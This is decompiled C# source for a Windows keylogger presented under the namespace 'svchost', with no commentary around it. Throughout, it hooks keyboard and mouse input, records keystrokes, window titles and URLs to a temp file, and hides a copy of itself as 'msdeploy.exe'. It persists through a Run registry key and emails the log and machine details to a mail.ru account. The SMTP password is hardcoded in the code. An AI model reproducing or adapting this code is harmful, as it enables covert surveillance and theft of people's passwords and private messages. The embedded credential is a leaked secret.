using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace svchost;

internal class Program
{
	private delegate IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam);

	private const int WH_KEYBOARD_LL = 13;

	private const int WM_KEYDOWN = 256;

	private const byte VK_SHIFT = 16;

	private const byte VK_CAPITAL = 20;

	private const int WH_MOUSE_LL = 14;

	private const int WM_LBUTTONDOWN = 513;

	private static HookProc k_hproc = KHC;

	private static HookProc m_hproc = MHC;

	private static IntPtr k_ID = IntPtr.Zero;

	private static IntPtr m_ID = IntPtr.Zero;

	private static StreamWriter sw;

	private static string prev_window_title = null;

	private static ushort prev_layout = 0;

	private static bool sending_clearing = false;

	private static Mutex m_mutex;

	private static void Main()
	{
		if (InstanceExists())
		{
			return;
		}
		try
		{
			saveToMSFolder();
			runAppOnStartup();
			markLoggingStartup();
			k_ID = SKH(k_hproc);
			m_ID = SMH(m_hproc);
			Application.Run();
			UnhookWindowsHookEx(k_ID);
			UnhookWindowsHookEx(m_ID);
		}
		catch
		{
			Application.Restart();
		}
	}

	private static IntPtr SKH(HookProc proc)
	{
		using Process process = Process.GetCurrentProcess();
		using ProcessModule processModule = process.MainModule;
		return SetWindowsHookEx(13, proc, GetModuleHandle(processModule.ModuleName), 0u);
	}

	private static IntPtr SMH(HookProc proc)
	{
		using Process process = Process.GetCurrentProcess();
		using ProcessModule processModule = process.MainModule;
		return SetWindowsHookEx(14, proc, GetModuleHandle(processModule.ModuleName), 0u);
	}

	private static IntPtr KHC(int nCode, IntPtr wParam, IntPtr lParam)
	{
		//IL_001e: Unknown result type (might be due to invalid IL or missing references)
		//IL_001f: Unknown result type (might be due to invalid IL or missing references)
		if (nCode >= 0 && wParam == (IntPtr)256)
		{
			int num = Marshal.ReadInt32(lParam);
			Keys key = (Keys)num;
			handleKey(key);
		}
		return CallNextHookEx(k_ID, nCode, wParam, lParam);
	}

	private static IntPtr MHC(int nCode, IntPtr wParam, IntPtr lParam)
	{
		if (nCode >= 0 && wParam == (IntPtr)513)
		{
			handleClick((MouseButtons)1048576);
		}
		return CallNextHookEx(m_ID, nCode, wParam, lParam);
	}

	private static void handleKey(Keys key)
	{
		//IL_002f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Unknown result type (might be due to invalid IL or missing references)
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_006b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Unknown result type (might be due to invalid IL or missing references)
		//IL_007a: Unknown result type (might be due to invalid IL or missing references)
		//IL_009b: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ca: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e4: Unknown result type (might be due to invalid IL or missing references)
		if (sending_clearing)
		{
			return;
		}
		bool flag = (GetKeyState(16) & 0x80) == 128;
		bool flag2 = ((GetKeyState(20) != 0) ? true : false);
		if (((object)key).ToString()!.Length > 1 && ((object)key).ToString() != "Space" && !ConstCollections.Oems.Contains(key) && !ConstCollections.Nums.Contains(key))
		{
			handleServiceKey(key);
			return;
		}
		char c;
		if (((object)key).ToString() == "Space")
		{
			c = ' ';
		}
		else if (ConstCollections.Oems.Contains(key))
		{
			c = transformOems(key);
			if (flag2 ^ flag)
			{
				c = ConstCollections.CapitalOems[c];
			}
		}
		else if (ConstCollections.Nums.Contains(key))
		{
			c = transformNums(key);
			if (flag2 ^ flag)
			{
				c = ConstCollections.CapitalNums[c];
			}
		}
		else
		{
			c = ((object)key).ToString()![0];
			if (!(flag2 ^ flag))
			{
				c = char.ToLower(c);
			}
		}
		handleCharKey(c);
	}

	private static void handleClick(MouseButtons button)
	{
		//IL_0008: Unknown result type (might be due to invalid IL or missing references)
		//IL_000e: Invalid comparison between Unknown and I4
		if (sending_clearing || (int)button != 1048576)
		{
			return;
		}
		using (sw = new StreamWriter(File.Open(Path.GetTempPath() + "REG7920.tmp", FileMode.Append, FileAccess.Write)))
		{
			IntPtr foregroundWindow = GetForegroundWindow();
			printActiveWindowTitle(foregroundWindow, sw);
			sw.WriteLine("[Click]");
		}
	}

	private static void handleServiceKey(Keys key)
	{
		//IL_0040: Unknown result type (might be due to invalid IL or missing references)
		//IL_0057: Unknown result type (might be due to invalid IL or missing references)
		//IL_0090: Unknown result type (might be due to invalid IL or missing references)
		if (new FileInfo(Path.GetTempPath() + "REG7920.tmp").Length >= 10000L)
		{
			sending_clearing = true;
			sendLog();
			clearLog();
			sending_clearing = false;
			Application.Restart();
		}
		else if (((object)key).ToString() != "LShiftKey" && ((object)key).ToString() != "RShiftKey")
		{
			using (sw = new StreamWriter(File.Open(Path.GetTempPath() + "REG7920.tmp", FileMode.Append, FileAccess.Write)))
			{
				printKeyData(((object)key).ToString(), sw);
			}
		}
	}

	private static void handleCharKey(char c)
	{
		using (sw = new StreamWriter(File.Open(Path.GetTempPath() + "REG7920.tmp", FileMode.Append, FileAccess.Write)))
		{
			IntPtr foregroundWindow = GetForegroundWindow();
			ushort keyboardLayout = GetKeyboardLayout(GetWindowThreadProcessId(foregroundWindow, IntPtr.Zero));
			printActiveWindowTitle(foregroundWindow, sw);
			printCurrentKeyboardLayout(keyboardLayout, sw);
			printKeyChar(keyboardLayout, c, sw);
		}
	}

	private static char transformOems(Keys key)
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0008: Unknown result type (might be due to invalid IL or missing references)
		//IL_002a: Expected I4, but got Unknown
		//IL_002a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0030: Unknown result type (might be due to invalid IL or missing references)
		//IL_0046: Expected I4, but got Unknown
		return (key - 186) switch
		{
			0 => ';', 
			1 => '=', 
			2 => ',', 
			3 => '-', 
			4 => '.', 
			5 => '/', 
			6 => '`', 
			_ => (key - 219) switch
			{
				0 => '[', 
				1 => '\\', 
				2 => ']', 
				3 => "'"[0], 
				_ => '#', 
			}, 
		};
	}

	private static char transformNums(Keys key)
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_0033: Expected I4, but got Unknown
		return (key - 48) switch
		{
			0 => '0', 
			1 => '1', 
			2 => '2', 
			3 => '3', 
			4 => '4', 
			5 => '5', 
			6 => '6', 
			7 => '7', 
			8 => '8', 
			9 => '9', 
			_ => '#', 
		};
	}

	private static void printKeyData(string key, StreamWriter sw)
	{
		if (ConstCollections.ServiceKeys.ContainsKey(key))
		{
			sw.WriteLine("[" + ConstCollections.ServiceKeys[key] + "]");
		}
		else
		{
			sw.WriteLine("[" + key + "]");
		}
	}

	private static void printActiveWindowTitle(IntPtr handle, StreamWriter sw)
	{
		StringBuilder stringBuilder = new StringBuilder(256);
		if (GetWindowText(handle, stringBuilder, 256) > 0 && prev_window_title != stringBuilder.ToString())
		{
			sw.WriteLine(string.Concat(Environment.NewLine, "[", DateTime.Now, " ", stringBuilder.ToString(), "]"));
			printCurrentUrl(handle, stringBuilder.ToString(), sw);
			prev_window_title = stringBuilder.ToString();
		}
	}

	private static void printCurrentUrl(IntPtr handle, string title, StreamWriter sw)
	{
		string url = UrlGetter.getUrl(handle, title);
		if (!string.IsNullOrEmpty(url))
		{
			sw.WriteLine(url);
		}
	}

	private static void printCurrentKeyboardLayout(ushort current_layout, StreamWriter sw)
	{
		if (prev_layout != current_layout)
		{
			if (current_layout.ToString() == "1033")
			{
				sw.WriteLine(Environment.NewLine + "[раскладка клавиатуры: EN-us]");
			}
			else if (current_layout.ToString() == "2057")
			{
				sw.WriteLine(Environment.NewLine + "[раскладка клавиатуры: EN-gb]");
			}
			else if (current_layout.ToString() == "1049")
			{
				sw.WriteLine(Environment.NewLine + "[раскладка клавиатуры: RU-ru]");
			}
			else
			{
				sw.WriteLine(Environment.NewLine + "[раскладка клавиатуры: " + current_layout + "]");
			}
			prev_layout = current_layout;
		}
	}

	private static void printKeyChar(ushort current_layout, char keychar, StreamWriter sw)
	{
		if (current_layout.ToString() == "1049")
		{
			if (ConstCollections.EngRusDict.ContainsKey(keychar))
			{
				sw.Write(ConstCollections.EngRusDict[keychar]);
			}
			else
			{
				sw.Write(keychar.ToString());
			}
		}
		else
		{
			sw.Write(keychar.ToString());
		}
	}

	private static void sendLog()
	{
		using MailMessage mailMessage = new MailMessage();
		mailMessage.From = new MailAddress("loup67@mail.ru", "G-Man", Encoding.Default);
		mailMessage.To.Add("loup67@mail.ru");
		mailMessage.Subject = "flawless victory";
		mailMessage.Body = "Machine Name: " + Environment.MachineName + Environment.NewLine;
		object body = mailMessage.Body;
		mailMessage.Body = string.Concat(body, "OS Version: ", Environment.OSVersion, Environment.NewLine);
		mailMessage.Body = mailMessage.Body + "User Name: " + Environment.UserName + Environment.NewLine;
		mailMessage.Body = mailMessage.Body + "Hostname: " + Dns.GetHostName();
		mailMessage.Attachments.Add(new Attachment(Path.GetTempPath() + "REG7920.tmp"));
		SmtpClientEx smtpClientEx = new SmtpClientEx("smtp.mail.ru", 25);
		smtpClientEx.Credentials = new NetworkCredential("loup67@mail.ru", "halifat67");
		smtpClientEx.LocalHostName = "mail.ru";
		smtpClientEx.Send(mailMessage);
	}

	private static void clearLog()
	{
		using (File.Create(Path.GetTempPath() + "REG7920.tmp"))
		{
		}
	}

	private static void saveToMSFolder()
	{
		if (!Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Microsoft"))
		{
			Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Microsoft");
		}
		if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Microsoft\\msdeploy.exe"))
		{
			File.Copy(Application.get_ExecutablePath(), Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Microsoft\\msdeploy.exe");
			File.SetAttributes(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Microsoft\\msdeploy.exe", FileAttributes.Hidden);
		}
	}

	private static void runAppOnStartup()
	{
		RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\");
		registryKey.SetValue("MSDeploy", Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Microsoft\\msdeploy.exe");
	}

	private static void markLoggingStartup()
	{
		using (sw = new StreamWriter(File.Open(Path.GetTempPath() + "REG7920.tmp", FileMode.Append, FileAccess.Write)))
		{
			sw.WriteLine(Environment.NewLine + "[" + DateTime.Now.ToString() + " ПРОЦЕСС СТАРТОВАЛ]");
		}
	}

	private static bool InstanceExists()
	{
		m_mutex = new Mutex(initiallyOwned: false, "OneInstanceApplication", out var createdNew);
		return !createdNew;
	}

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr SetWindowsHookEx(int idHook, HookProc lpfn, IntPtr hMod, uint dwThreadId);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool UnhookWindowsHookEx(IntPtr hhk);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

	[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr GetModuleHandle(string lpModuleName);

	[DllImport("user32.dll", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Auto)]
	private static extern short GetKeyState(int vKey);

	[DllImport("user32.dll")]
	private static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

	[DllImport("user32.dll")]
	private static extern IntPtr GetForegroundWindow();

	[DllImport("user32.dll", SetLastError = true)]
	private static extern int GetWindowThreadProcessId([In] IntPtr hWnd, [Optional][Out] IntPtr lpdwProcessId);

	[DllImport("user32.dll", SetLastError = true)]
	private static extern ushort GetKeyboardLayout([In] int idThread);
}
